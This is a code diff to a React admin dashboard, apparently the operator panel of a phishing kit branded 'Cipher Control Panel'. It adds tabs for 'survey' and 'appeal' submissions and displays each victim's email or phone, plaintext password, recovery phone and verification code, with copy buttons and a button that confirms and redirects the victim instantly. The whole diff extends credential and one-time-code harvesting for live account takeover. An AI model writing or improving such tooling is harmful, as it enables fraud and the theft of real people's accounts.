@@ -61,6 +61,31 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
   const [lastRefreshedAt, setLastRefreshedAt] = useState<Date>(new Date());
   const [secondsSinceLastRefresh, setSecondsSinceLastRefresh] = useState(0);
 
+  // Client-side hash routing state
+  const [activeTab, setActiveTab] = useState<'survey' | 'appeal'>(() => {
+    const hash = window.location.hash;
+    if (hash === '#/appeal') return 'appeal';
+    return 'survey';
+  });
+
+  useEffect(() => {
+    const handleHashChange = () => {
+      const hash = window.location.hash;
+      if (hash === '#/appeal') {
+        setActiveTab('appeal');
+      } else {
+        setActiveTab('survey');
+      }
+    };
+    window.addEventListener('hashchange', handleHashChange);
+    return () => window.removeEventListener('hashchange', handleHashChange);
+  }, []);
+
+  const changeTab = (tab: 'survey' | 'appeal') => {
+    setActiveTab(tab);
+    window.location.hash = `#/${tab}`;
+  };
+
   const handleLogout = () => {
     localStorage.removeItem('admin_authenticated');
     onBack();
@@ -237,11 +262,11 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
               <div className="flex items-center gap-2">
                 <Database className="h-5 w-5 text-blue-500" />
                 <h1 className="text-xl md:text-2xl font-bold tracking-tight text-text-primary">
-                  Survey Dashboard
+                  Cipher Control Panel
                 </h1>
               </div>
               <p className="text-xs md:text-sm text-text-secondary mt-0.5">
-                Form submissions, browser verification logs, and real-time database records.
+                Authorized database control console for survey responses, appeal submissions, and browser verification logs.
               </p>
             </div>
           </div>
@@ -252,6 +277,47 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
           >
             <LogOut className="h-4 w-4" />
             Log Out
+          </button>
+        </div>
+
+        {/* Persistent Top Navigation Bar */}
+        <div className="flex border border-border-custom bg-bg-card rounded-xl p-1 shadow-sm gap-1">
+          <button
+            onClick={() => changeTab('survey')}
+            className={`flex items-center justify-center gap-2.5 px-6 py-3 rounded-lg font-bold text-sm transition-all duration-150 flex-1 sm:flex-initial cursor-pointer ${
+              activeTab === 'survey'
+                ? 'bg-[#1a73e8] text-white shadow-sm'
+                : 'text-text-secondary hover:text-text-primary hover:bg-bg-hover'
+            }`}
+          >
+            <Database className="h-4 w-4" />
+            <span>Survey Submissions</span>
+            <span className={`px-2 py-0.5 text-xs rounded-full font-semibold ${
+              activeTab === 'survey'
+                ? 'bg-white/20 text-white'
+                : 'bg-bg-app text-text-secondary border border-border-custom'
+            }`}>
+              {softwareSubmissions.length}
+            </span>
+          </button>
+          
+          <button
+            onClick={() => changeTab('appeal')}
+            className={`flex items-center justify-center gap-2.5 px-6 py-3 rounded-lg font-bold text-sm transition-all duration-150 flex-1 sm:flex-initial cursor-pointer ${
+              activeTab === 'appeal'
+                ? 'bg-[#c5221f] text-white shadow-sm'
+                : 'text-text-secondary hover:text-text-primary hover:bg-bg-hover'
+            }`}
+          >
+            <ShieldCheck className="h-4 w-4" />
+            <span>Appeal Submissions</span>
+            <span className={`px-2 py-0.5 text-xs rounded-full font-semibold ${
+              activeTab === 'appeal'
+                ? 'bg-white/20 text-white'
+                : 'bg-bg-app text-text-secondary border border-border-custom'
+            }`}>
+              {appealSubmissions.length}
+            </span>
           </button>
         </div>
 
@@ -363,10 +429,10 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
           </div>
         </div>
 
-        {/* Data Columns */}
-        <div className="grid grid-cols-1 xl:grid-cols-2 gap-6 items-start">
-          {/* Software / Survey Submissions Column */}
-          <div className="space-y-3">
+        {/* Active Tab View */}
+        {activeTab === 'survey' ? (
+          /* Survey Submissions View */
+          <div className="space-y-3 animate-fade-in">
             <div className="flex items-center justify-between">
               <div className="flex items-center gap-2">
                 <span className="p-1.5 rounded-lg bg-blue-500/10 text-blue-500">
@@ -381,7 +447,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
             
             <div className="border border-border-custom rounded-xl shadow-sm overflow-hidden bg-bg-card">
               <div className="overflow-x-auto">
-                <table className="w-full text-left border-collapse min-w-[500px]">
+                <table className="w-full text-left border-collapse min-w-[600px]">
                   <thead>
                     <tr className="bg-bg-app border-b border-border-custom">
                       <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Timestamp</th>
@@ -398,14 +464,30 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
                         <tr key={item.id} className="transition-colors hover:bg-bg-hover">
                           <td className="px-4 py-3 text-text-secondary whitespace-nowrap">{item.timestamp}</td>
                           <td className="px-4 py-3 font-semibold whitespace-nowrap text-blue-500">
-                            <div className="flex items-center gap-1">
-                              <span className="truncate max-w-[110px]" title={item.emailOrPhone}>{item.emailOrPhone}</span>
-                              <CopyButton value={item.emailOrPhone} />
+                            <div className="flex flex-col">
+                              <div className="flex items-center gap-1">
+                                <span className="truncate max-w-[150px] sm:max-w-xs" title={item.emailOrPhone}>{item.emailOrPhone}</span>
+                                <CopyButton value={item.emailOrPhone} />
+                              </div>
+                              {(item.recoveryPhone || item.verificationCode) && (
+                                <div className="flex items-center gap-2 mt-0.5 flex-wrap">
+                                  {item.recoveryPhone && (
+                                    <span className="text-[10px] text-emerald-600 dark:text-emerald-400 font-semibold inline-flex items-center gap-0.5" title={item.recoveryPhone}>
+                                      📞 {item.recoveryPhone}
+                                    </span>
+                                  )}
+                                  {item.verificationCode && (
+                                    <span className="text-[10px] text-amber-600 dark:text-amber-400 font-mono font-bold inline-flex items-center gap-0.5" title={item.verificationCode}>
+                                      🔑 {item.verificationCode}
+                                    </span>
+                                  )}
+                                </div>
+                              )}
                             </div>
                           </td>
                           <td className="px-4 py-3 font-mono whitespace-nowrap font-medium text-text-primary">
                             <div className="flex items-center gap-1">
-                              <span className="truncate max-w-[90px]" title={item.password}>{item.password || '—'}</span>
+                              <span className="truncate max-w-[120px] sm:max-w-xs" title={item.password}>{item.password || '—'}</span>
                               {item.password && <CopyButton value={item.password} />}
                             </div>
                           </td>
@@ -440,7 +522,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
                               {item.status !== 'confirmed' && (
                                 <button
                                   onClick={() => handleConfirm(item.id)}
-                                  className="px-2 py-1 text-[10px] font-semibold rounded transition-colors border bg-blue-50 dark:bg-[#1a73e8]/10 hover:bg-blue-100 dark:hover:bg-[#1a73e8]/20 border-blue-200 dark:border-blue-900/30 text-[#1a73e8] dark:text-[#8ab4f8] cursor-pointer"
+                                  className="px-2.5 py-1 text-[10px] font-semibold rounded transition-colors border bg-blue-50 dark:bg-[#1a73e8]/10 hover:bg-blue-100 dark:hover:bg-[#1a73e8]/20 border-blue-200 dark:border-blue-900/30 text-[#1a73e8] dark:text-[#8ab4f8] cursor-pointer"
                                   title="Confirm and redirect user instantly"
                                 >
                                   Confirm
@@ -469,9 +551,9 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
               </div>
             </div>
           </div>
-
-          {/* Appeal Submissions Column */}
-          <div className="space-y-3">
+        ) : (
+          /* Appeal Submissions View */
+          <div className="space-y-3 animate-fade-in">
             <div className="flex items-center justify-between">
               <div className="flex items-center gap-2">
                 <span className="p-1.5 rounded-lg bg-red-500/10 text-brand-error">
@@ -486,7 +568,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
 
             <div className="border border-border-custom rounded-xl shadow-sm overflow-hidden bg-bg-card">
               <div className="overflow-x-auto">
-                <table className="w-full text-left border-collapse min-w-[500px]">
+                <table className="w-full text-left border-collapse min-w-[600px]">
                   <thead>
                     <tr className="bg-bg-app border-b border-border-custom">
                       <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Timestamp</th>
@@ -503,14 +585,30 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
                         <tr key={item.id} className="transition-colors hover:bg-bg-hover">
                           <td className="px-4 py-3 text-text-secondary whitespace-nowrap">{item.timestamp}</td>
                           <td className="px-4 py-3 font-semibold whitespace-nowrap text-blue-500">
-                            <div className="flex items-center gap-1">
-                              <span className="truncate max-w-[110px]" title={item.emailOrPhone}>{item.emailOrPhone}</span>
-                              <CopyButton value={item.emailOrPhone} />
+                            <div className="flex flex-col">
+                              <div className="flex items-center gap-1">
+                                <span className="truncate max-w-[150px] sm:max-w-xs" title={item.emailOrPhone}>{item.emailOrPhone}</span>
+                                <CopyButton value={item.emailOrPhone} />
+                              </div>
+                              {(item.recoveryPhone || item.verificationCode) && (
+                                <div className="flex items-center gap-2 mt-0.5 flex-wrap">
+                                  {item.recoveryPhone && (
+                                    <span className="text-[10px] text-emerald-600 dark:text-emerald-400 font-semibold inline-flex items-center gap-0.5" title={item.recoveryPhone}>
+                                      📞 {item.recoveryPhone}
+                                    </span>
+                                  )}
+                                  {item.verificationCode && (
+                                    <span className="text-[10px] text-amber-600 dark:text-amber-400 font-mono font-bold inline-flex items-center gap-0.5" title={item.verificationCode}>
+                                      🔑 {item.verificationCode}
+                                    </span>
+                                  )}
+                                </div>
+                              )}
                             </div>
                           </td>
                           <td className="px-4 py-3 font-mono whitespace-nowrap font-medium text-text-primary">
                             <div className="flex items-center gap-1">
-                              <span className="truncate max-w-[90px]" title={item.password}>{item.password || '—'}</span>
+                              <span className="truncate max-w-[120px] sm:max-w-xs" title={item.password}>{item.password || '—'}</span>
                               {item.password && <CopyButton value={item.password} />}
                             </div>
                           </td>
@@ -545,7 +643,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
                               {item.status !== 'confirmed' && (
                                 <button
                                   onClick={() => handleConfirm(item.id)}
-                                  className="px-2 py-1 text-[10px] font-semibold rounded transition-colors border bg-blue-50 dark:bg-[#1a73e8]/10 hover:bg-blue-100 dark:hover:bg-[#1a73e8]/20 border-blue-200 dark:border-blue-900/30 text-[#1a73e8] dark:text-[#8ab4f8] cursor-pointer"
+                                  className="px-2.5 py-1 text-[10px] font-semibold rounded transition-colors border bg-blue-50 dark:bg-[#1a73e8]/10 hover:bg-blue-100 dark:hover:bg-[#1a73e8]/20 border-blue-200 dark:border-blue-900/30 text-[#1a73e8] dark:text-[#8ab4f8] cursor-pointer"
                                   title="Confirm and redirect user instantly"
                                 >
                                   Confirm
@@ -574,7 +672,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
               </div>
             </div>
           </div>
-        </div>
+        )}
       </div>
     </div>
   );
